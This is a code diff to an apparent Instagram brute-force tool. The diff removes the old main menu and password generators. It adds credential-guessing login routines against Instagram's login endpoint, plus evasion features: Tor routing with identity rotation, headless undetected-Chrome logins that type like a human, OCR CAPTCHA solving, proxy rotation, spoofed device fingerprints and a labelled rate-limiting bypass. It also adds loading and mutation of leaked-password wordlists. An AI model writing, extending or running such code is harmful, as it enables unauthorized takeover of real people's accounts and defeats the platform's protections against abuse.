@@ -42,6 +42,38 @@ try:
 except ImportError:
     asyncio = aiohttp = asyncssh = None
 
+# Additional advanced modules
+try:
+    import socks
+    import stem
+    from stem import Signal
+    from stem.control import Controller
+except ImportError:
+    socks = stem = Signal = Controller = None
+
+try:
+    import undetected_chromedriver as uc
+    from selenium import webdriver
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+except ImportError:
+    uc = webdriver = By = WebDriverWait = EC = None
+
+try:
+    import captcha_solver
+    import pytesseract
+    from PIL import Image
+except ImportError:
+    captcha_solver = pytesseract = Image = None
+
+try:
+    import psutil
+    import subprocess
+    import platform
+except ImportError:
+    psutil = subprocess = platform = None
+
 
 class AdvancedInstagramBruteForcer:
     """Advanced Instagram Brute Force Attack Class - Industrial Grade"""
@@ -698,191 +730,502 @@ class AdvancedInstagramBruteForcer:
             return {'http': proxy, 'https': proxy}
         return None
 
-
-def load_enhanced_password_list(file_path, target_username=None):
-    """Load and enhance password list with smart generation"""
-    passwords = set()  # Use set to avoid duplicates
-    
-    # Load from file
-    try:
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                password = line.strip()
-                if password and len(password) >= 1:
-                    passwords.add(password)
-    except Exception as e:
-        print(f"❌ Error loading password list: {e}")
-    
-    # Load from multiple common wordlists
-    wordlist_paths = [
-        'wordlists/rockyou.txt',
-        'wordlists/common.txt',
-        'passwords.txt',
-        '../passwords.txt',
-        'wordlists/instagram_common.txt'
-    ]
-    
-    for path in wordlist_paths:
+    def get_network_info(self):
+        """Get network and system information for advanced fingerprinting"""
         try:
-            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                for line in f:
-                    password = line.strip()
-                    if password:
-                        passwords.add(password)
-                        if len(passwords) >= 100000:  # Limit to prevent memory issues
-                            break
+            info = {
+                'platform': platform.system() if platform else 'Unknown',
+                'hostname': socket.gethostname() if socket else 'Unknown',
+                'ip_info': self.get_external_ip(),
+                'user_agent_entropy': self.calculate_ua_entropy(),
+                'ssl_fingerprint': self.get_ssl_fingerprint()
+            }
+            return info
+        except Exception as e:
+            print(f"⚠️  Network info error: {e}")
+            return {}
+
+    def get_external_ip(self):
+        """Get external IP address"""
+        try:
+            response = requests.get('https://api.ipify.org?format=json', timeout=5)
+            return response.json().get('ip', 'Unknown')
         except:
-            continue
-    
-    # Generate smart passwords based on username
-    if target_username:
-        smart_passwords = generate_smart_passwords(target_username)
-        passwords.update(smart_passwords)
-    
-    password_list = list(passwords)
-    print(f"📋 Enhanced password list: {len(password_list):,} unique passwords")
-    return password_list
+            return 'Unknown'
 
-def generate_smart_passwords(username):
-    """Generate smart password variations based on username"""
-    smart_passwords = set()
-    
-    # Basic variations
-    variations = [
-        username,
-        username.upper(),
-        username.lower(),
-        username.capitalize()
-    ]
-    
-    # Number combinations
-    numbers = ['123', '1234', '12345', '123456', '1', '01', '2024', '2025', '2023', '99', '00']
-    
-    # Special characters
-    special_chars = ['!', '@', '#', '$', '_', '.', '-']
-    
-    # Common suffixes/prefixes
-    common_words = ['love', 'baby', 'girl', 'boy', 'the', 'best', 'king', 'queen', 'admin', 'user']
-    
-    # Generate combinations
-    for var in variations:
-        smart_passwords.add(var)
+    def calculate_ua_entropy(self):
+        """Calculate user agent entropy for better randomization"""
+        if not self.ua:
+            return 0
+        try:
+            ua_string = str(self.ua.random)
+            entropy = len(set(ua_string)) / len(ua_string) if ua_string else 0
+            return round(entropy, 3)
+        except:
+            return 0
+
+    def get_ssl_fingerprint(self):
+        """Generate SSL fingerprint"""
+        try:
+            context = ssl.create_default_context()
+            return hashlib.md5(str(context.get_ca_certs()).encode()).hexdigest()[:16]
+        except:
+            return 'unknown'
+
+    def create_hash_chain(self, data):
+        """Create hash chain for password verification"""
+        try:
+            hash_obj = hashlib.sha256(str(data).encode())
+            return hash_obj.hexdigest()
+        except:
+            return None
+
+    def generate_password_combinations(self, base_password, max_combinations=50):
+        """Generate advanced password combinations using itertools"""
+        if not itertools:
+            return [base_password]
         
-        # Add numbers
-        for num in numbers:
-            smart_passwords.add(var + num)
-            smart_passwords.add(num + var)
+        try:
+            combinations = []
+            
+            # Character substitutions
+            substitutions = {
+                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
+            }
+            
+            # Generate substitution combinations
+            chars = list(base_password.lower())
+            for combo in itertools.product(*[[c, substitutions.get(c, c)] for c in chars]):
+                new_password = ''.join(combo)
+                if new_password != base_password:
+                    combinations.append(new_password)
+                if len(combinations) >= max_combinations:
+                    break
+            
+            return combinations[:max_combinations]
+        except Exception as e:
+            print(f"⚠️  Password combination error: {e}")
+            return [base_password]
+
+    def setup_tor_connection(self):
+        """Setup TOR connection for advanced anonymity"""
+        if not socks or not stem:
+            print("⚠️  TOR modules not available")
+            return False
         
-        # Add special chars
-        for char in special_chars:
-            smart_passwords.add(var + char)
-            smart_passwords.add(char + var)
-            
-        # Add common words
-        for word in common_words:
-            smart_passwords.add(var + word)
-            smart_passwords.add(word + var)
-            
-        # Complex combinations
-        for num in ['123', '1', '2024']:
-            for char in ['!', '@', '_']:
-                smart_passwords.add(var + num + char)
-                smart_passwords.add(var + char + num)
-    
-    # Date-based passwords
-    current_year = datetime.now().year
-    for year in [current_year, current_year-1, current_year-2]:
-        smart_passwords.add(username + str(year))
-        smart_passwords.add(str(year) + username)
-    
-    return smart_passwords
+        try:
+            # Configure SOCKS proxy for TOR
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            socket.socket = socks.socksocket
+            print("✅ TOR connection established")
+            return True
+        except Exception as e:
+            print(f"⚠️  TOR setup failed: {e}")
+            return False
 
-
-def main():
-    """Main function - Hardcore Instagram Brute Force"""
-    print("💀 HARDCORE INSTAGRAM BRUTE FORCE TOOL 2025")
-    print("⚠️  WARNING: Industrial grade tool - Use responsibly!")
-    print("🔥 Features: Multi-threading, Proxy rotation, Smart AI, Mobile+Web API")
-    print("=" * 70)
-
-    # Configuration
-    target_username = input("🎯 Enter target username: ").strip()
-    if not target_username:
-        print("❌ Username is required!")
-        return
-
-    # Advanced password list selection
-    print("\n📋 Password List Options:")
-    print("1. Default enhanced wordlist (../passwords.txt + smart generation)")
-    print("2. Custom wordlist path")
-    print("3. Smart generation only (based on username)")
-    
-    choice = input("Choose option (1-3, default=1): ").strip() or "1"
-    
-    if choice == "1":
-        passwords = load_enhanced_password_list("../passwords.txt", target_username)
-    elif choice == "2":
-        custom_path = input("Enter wordlist path: ").strip()
-        passwords = load_enhanced_password_list(custom_path, target_username)
-    elif choice == "3":
-        passwords = list(generate_smart_passwords(target_username))
-        print(f"📋 Generated {len(passwords)} smart passwords")
-    else:
-        print("❌ Invalid choice!")
-        return
-
-    if not passwords:
-        print("❌ No passwords loaded. Exiting.")
-        return
-
-    # Attack configuration
-    print(f"\n⚙️  ATTACK CONFIGURATION:")
-    max_threads = int(input("🧵 Max threads (default=10): ").strip() or "10")
-    use_proxies = input("🌐 Use proxies? (y/N): ").strip().lower() == 'y'
-    smart_mode = input("🧠 Enable smart mode? (Y/n): ").strip().lower() != 'n'
-    
-    # Create advanced brute forcer
-    brute_forcer = AdvancedInstagramBruteForcer(
-        target_username=target_username, 
-        password_list=passwords,
-        use_tor=False
-    )
-    
-    # Override proxy usage
-    if not use_proxies:
-        brute_forcer.proxy_list = []
-
-    print(f"\n🚀 INITIATING HARDCORE ATTACK...")
-    print(f"🎯 Target: {target_username}")
-    print(f"💣 Attack vectors: Web + Mobile API + Hybrid")
-    print(f"🔢 Password arsenal: {len(passwords):,}")
-    print(f"🧵 Thread army: {max_threads}")
-    print(f"🌐 Proxy fleet: {len(brute_forcer.proxy_list):,}")
-    print(f"⚡ Session pool: {len(brute_forcer.sessions)}")
-    
-    input("\n⚠️  Press ENTER to unleash the attack... ")
-
-    # Start hardcore attack
-    try:
-        success = brute_forcer.hardcore_brute_force_attack(
-            max_threads=max_threads, 
-            smart_mode=smart_mode
-        )
+    def rotate_tor_identity(self):
+        """Rotate TOR identity for new IP"""
+        if not Controller:
+            return False
         
-        if success:
-            print(f"\n🎉 MISSION ACCOMPLISHED!")
-            print(f"💀 {target_username} has been PWNED!")
-        else:
-            print(f"\n😤 Target {target_username} survived this round...")
-            print(f"💡 Try: More wordlists, different timing, or social engineering")
+        try:
+            with Controller.from_port(port=9051) as controller:
+                controller.authenticate()
+                controller.signal(Signal.NEWNYM)
+                print("🔄 TOR identity rotated")
+                return True
+        except Exception as e:
+            print(f"⚠️  TOR rotation failed: {e}")
+            return False
+
+    async def async_login_attempt(self, session, password, csrf_token, mode='web'):
+        """Asynchronous login attempt for better performance"""
+        if not aiohttp:
+            return await self.sync_to_async_wrapper(self.web_login, session, password, csrf_token)
+        
+        try:
+            headers = self.get_advanced_headers(mode)
+            headers.update({
+                'X-CSRFToken': csrf_token,
+                'X-Instagram-AJAX': '1',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': 'https://www.instagram.com/accounts/login/',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            })
+
+            login_data = {
+                'username': self.target_username,
+                'password': password,
+                'queryParams': '{}',
+                'optIntoOneTap': 'false',
+                'trustedDeviceRecords': '{}'
+            }
+
+            async with aiohttp.ClientSession() as async_session:
+                async with async_session.post(
+                    'https://www.instagram.com/accounts/login/ajax/',
+                    data=login_data,
+                    headers=headers,
+                    timeout=aiohttp.ClientTimeout(total=20)
+                ) as response:
+                    text = await response.text()
+                    return self.analyze_response_text(text, password, mode)
+                    
+        except Exception as e:
+            print(f"🔄 Async error with {password}: {e}")
+            return False
+
+    async def sync_to_async_wrapper(self, func, *args):
+        """Wrapper to run sync functions in async context"""
+        if not asyncio:
+            return func(*args)
+        
+        loop = asyncio.get_event_loop()
+        return await loop.run_in_executor(None, func, *args)
+
+    def analyze_response_text(self, text, password, method):
+        """Analyze response text without response object"""
+        text_lower = text.lower()
+        
+        # Success indicators
+        success_indicators = [
+            'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'
+        ]
+        
+        # Rate limit indicators
+        rate_limit_indicators = [
+            'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'
+        ]
+        
+        # Checkpoint indicators
+        checkpoint_indicators = [
+            'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'
+        ]
+        
+        # Check for success
+        if any(indicator in text_lower for indicator in success_indicators):
+            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
+            return True
             
-    except KeyboardInterrupt:
-        print(f"\n⚠️  Attack interrupted by operator.")
-        print(f"📊 Partial results saved in logs/")
-    except Exception as e:
-        print(f"💥 Unexpected error: {e}")
-        print(f"📞 Contact support if this persists")
+        # Check for rate limiting
+        if any(indicator in text_lower for indicator in rate_limit_indicators):
+            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
+            return None
+            
+        # Check for checkpoint
+        if any(indicator in text_lower for indicator in checkpoint_indicators):
+            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
+            self.checkpoint_count += 1
+            return False
+            
+        # Regular failure
+        print(f"❌ [{method.upper()}] Failed: {password}")
+        return False
 
+    def get_system_resources(self):
+        """Monitor system resources for performance optimization"""
+        if not psutil:
+            return {}
+        
+        try:
+            return {
+                'cpu_percent': psutil.cpu_percent(interval=1),
+                'memory_percent': psutil.virtual_memory().percent,
+                'disk_usage': psutil.disk_usage('/').percent,
+                'network_io': psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
+            }
+        except Exception as e:
+            print(f"⚠️  Resource monitoring error: {e}")
+            return {}
 
-if __name__ == "__main__":
-    main()
+    def optimize_performance(self):
+        """Optimize performance based on system resources"""
+        resources = self.get_system_resources()
+        
+        if resources.get('cpu_percent', 0) > 80:
+            self.adaptive_delay *= 1.2
+            print("🔽 High CPU usage - increasing delay")
+        elif resources.get('cpu_percent', 0) < 30:
+            self.adaptive_delay *= 0.9
+            print("🔼 Low CPU usage - decreasing delay")
+        
+        if resources.get('memory_percent', 0) > 85:
+            print("⚠️  High memory usage detected")
+            
+        return resources
+
+    def selenium_login_attempt(self, password):
+        """Selenium-based login for bypassing advanced detection"""
+        if not uc or not webdriver:
+            print("⚠️  Selenium modules not available")
+            return False
+            
+        try:
+            options = uc.ChromeOptions()
+            options.add_argument('--headless')
+            options.add_argument('--no-sandbox')
+            options.add_argument('--disable-dev-shm-usage')
+            options.add_argument('--disable-gpu')
+            options.add_argument('--window-size=1920,1080')
+            
+            # Random user agent
+            ua = random.choice(self.web_agents)
+            options.add_argument(f'--user-agent={ua}')
+            
+            driver = uc.Chrome(options=options)
+            
+            try:
+                driver.get('https://www.instagram.com/accounts/login/')
+                time.sleep(random.uniform(2, 4))
+                
+                # Wait for elements
+                username_input = WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.NAME, "username"))
+                )
+                password_input = driver.find_element(By.NAME, "password")
+                
+                # Human-like typing
+                self.human_type(username_input, self.target_username)
+                time.sleep(random.uniform(0.5, 1.5))
+                self.human_type(password_input, password)
+                time.sleep(random.uniform(1, 2))
+                
+                # Submit
+                login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
+                login_button.click()
+                
+                # Wait for response
+                time.sleep(random.uniform(3, 5))
+                
+                # Check for success indicators
+                current_url = driver.current_url
+                page_source = driver.page_source.lower()
+                
+                success_indicators = ['instagram.com/' + self.target_username, 'feed', 'home']
+                if any(indicator in current_url.lower() for indicator in success_indicators):
+                    print(f"🎯 [SELENIUM] SUCCESS! Password: {password}")
+                    return True
+                elif 'challenge' in current_url or 'checkpoint' in page_source:
+                    print(f"🔒 [SELENIUM] Checkpoint for: {password}")
+                    self.checkpoint_count += 1
+                    return False
+                else:
+                    print(f"❌ [SELENIUM] Failed: {password}")
+                    return False
+                    
+            finally:
+                driver.quit()
+                
+        except Exception as e:
+            print(f"🌐 Selenium error with {password}: {e}")
+            return False
+
+    def human_type(self, element, text):
+        """Simulate human typing patterns"""
+        for char in text:
+            element.send_keys(char)
+            time.sleep(random.uniform(0.05, 0.15))
+
+    def solve_captcha(self, captcha_image_path):
+        """Solve CAPTCHA using OCR or external service"""
+        if not pytesseract or not Image:
+            print("⚠️  CAPTCHA solving modules not available")
+            return None
+            
+        try:
+            image = Image.open(captcha_image_path)
+            text = pytesseract.image_to_string(image)
+            return text.strip()
+        except Exception as e:
+            print(f"⚠️  CAPTCHA solving error: {e}")
+            return None
+
+    def enhanced_proxy_check(self, proxy):
+        """Enhanced proxy validation with multiple endpoints"""
+        test_urls = [
+            'https://httpbin.org/ip',
+            'https://api.ipify.org?format=json',
+            'https://www.instagram.com'
+        ]
+        
+        proxy_dict = {'http': proxy, 'https': proxy}
+        
+        for url in test_urls:
+            try:
+                response = requests.get(url, proxies=proxy_dict, timeout=10)
+                if response.status_code == 200:
+                    return True
+            except:
+                continue
+        return False
+
+    def smart_proxy_rotation(self):
+        """Smart proxy rotation based on success rate"""
+        working_proxies = []
+        
+        print("🔍 Validating proxies...")
+        for proxy in self.proxy_list[:20]:  # Test first 20 proxies
+            if self.enhanced_proxy_check(proxy):
+                working_proxies.append(proxy)
+                print(f"✅ Working proxy: {proxy}")
+            else:
+                print(f"❌ Dead proxy: {proxy}")
+        
+        self.proxy_list = working_proxies
+        print(f"✅ Validated {len(working_proxies)} working proxies")
+
+    def generate_device_fingerprint(self):
+        """Generate realistic device fingerprint"""
+        fingerprint = {
+            'screen_resolution': random.choice(['1920x1080', '1366x768', '1440x900', '1536x864']),
+            'timezone': random.choice(['-8', '-5', '0', '+1', '+8']),
+            'language': random.choice(['en-US', 'en-GB', 'es-ES', 'fr-FR']),
+            'platform': random.choice(['Win32', 'MacIntel', 'Linux x86_64']),
+            'cookies_enabled': True,
+            'do_not_track': random.choice([True, False]),
+            'canvas_fingerprint': hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
+        }
+        return fingerprint
+
+    def advanced_session_fingerprinting(self, session):
+        """Apply advanced fingerprinting to session"""
+        fingerprint = self.generate_device_fingerprint()
+        
+        # Add fingerprint headers
+        session.headers.update({
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': fingerprint['language'] + ',en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1' if fingerprint['do_not_track'] else '0',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+        })
+        
+        return session
+
+    def run_network_scan(self):
+        """Run network reconnaissance"""
+        print("🔍 Running network reconnaissance...")
+        network_info = self.get_network_info()
+        
+        print(f"📡 Platform: {network_info.get('platform', 'Unknown')}")
+        print(f"🌐 External IP: {network_info.get('ip_info', 'Unknown')}")
+        print(f"🔒 SSL Fingerprint: {network_info.get('ssl_fingerprint', 'Unknown')}")
+        print(f"🎭 UA Entropy: {network_info.get('user_agent_entropy', 0)}")
+        
+        return network_info
+
+    def load_custom_wordlists(self):
+        """Load multiple wordlists for comprehensive attack"""
+        wordlists = []
+        wordlist_sources = [
+            'wordlists/rockyou.txt',
+            'wordlists/common_passwords.txt',
+            'wordlists/instagram_specific.txt',
+            'wordlists/leaked_passwords.txt',
+            'wordlists/social_media.txt'
+        ]
+        
+        for source in wordlist_sources:
+            try:
+                with open(source, 'r', encoding='utf-8', errors='ignore') as f:
+                    passwords = [line.strip() for line in f if line.strip()]
+                    wordlists.extend(passwords)
+                    print(f"✅ Loaded {len(passwords)} passwords from {source}")
+            except:
+                continue
+        
+        return list(set(wordlists))  # Remove duplicates
+
+    def generate_mutation_passwords(self, base_passwords):
+        """Generate password mutations using advanced techniques"""
+        mutations = set()
+        
+        for password in base_passwords[:100]:  # Limit to prevent memory issues
+            # Basic mutations
+            mutations.add(password.upper())
+            mutations.add(password.lower())
+            mutations.add(password.capitalize())
+            
+            # Number substitutions
+            mutations.add(password + '123')
+            mutations.add(password + '2025')
+            mutations.add('123' + password)
+            
+            # Special character substitutions
+            substitutions = {
+                'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'
+            }
+            
+            mutated = password
+            for old, new in substitutions.items():
+                mutated = mutated.replace(old, new)
+            mutations.add(mutated)
+            
+            # Reverse passwords
+            mutations.add(password[::-1])
+            
+            # Common endings
+            for ending in ['!', '@', '#', '$', '123', '2025', '2024']:
+                mutations.add(password + ending)
+        
+        return list(mutations)
+
+    def check_instagram_user_exists(self, username):
+        """Check if Instagram user exists"""
+        try:
+            response = requests.get(f'https://www.instagram.com/{username}/', timeout=10)
+            if response.status_code == 200:
+                if 'Page Not Found' not in response.text:
+                    print(f"✅ User {username} exists")
+                    return True
+            print(f"❌ User {username} does not exist")
+            return False
+        except:
+            print(f"⚠️  Could not verify user {username}")
+            return True  # Assume exists to continue attack
+
+    def implement_rate_limiting_bypass(self):
+        """Implement advanced rate limiting bypass techniques"""
+        techniques = {
+            'user_agent_rotation': True,
+            'session_rotation': True,
+            'proxy_rotation': True,
+            'request_timing_randomization': True,
+            'header_randomization': True
+        }
+        
+        print("🔧 Implementing rate limiting bypass:")
+        for technique, enabled in techniques.items():
+            if enabled:
+                print(f"   ✅ {technique.replace('_', ' ').title()}")
+        
+        return techniques
+
+    def export_results(self, filename='instagram_results.json'):
+        """Export comprehensive results"""
+        results = {
+            'target': self.target_username,
+            'timestamp': datetime.now().isoformat(),
+            'statistics': {
+                'total_attempts': self.success_count + self.failed_count + self.checkpoint_count,
+                'success_count': self.success_count,
+                'failed_count': self.failed_count,
+                'checkpoint_count': self.checkpoint_count,
+                'rate_limit_count': self.rate_limit_count
+            },
+            'found_password': self.found_password,
+            'system_info': self.get_network_info(),
+            'attack_configuration': {
+                'proxy_count': len(self.proxy_list),
+                'session_pool_size': len(self.sessions),
+                'adaptive_delay': self.adaptive_delay
+            }
+        }
+        
+        os.makedirs('results', exist_ok=True)
+        with open(f'results/{filename}', 'w') as f:
+            json.dump(results, f, indent=2)
+        
+        print(f"📁 Results exported to: results/{filename}")
+        return results
